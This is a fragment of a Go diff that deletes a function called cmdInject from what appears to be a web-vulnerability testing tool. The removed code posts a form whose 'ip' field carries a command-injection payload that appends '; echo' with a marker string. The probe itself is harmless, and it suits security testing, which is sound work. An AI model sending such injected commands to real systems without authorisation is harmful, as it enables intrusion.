@@ -67,25 +67,3 @@ func login(site string, path string, client *http.Client) {
 	})
 
 }
-
-func cmdInject(site string, path string, client *http.Client) {
-	final := site + path
-
-	resp, err := client.PostForm(final, url.Values{
-		"ip":     {"; echo 'cmd-inject-PWNED'"},
-		"Submit": {"Submit"},
-	})
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	defer resp.Body.Close()
-
-	data, err := ioutil.ReadAll(resp.Body)
-
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	fmt.Println(string(data))
-}
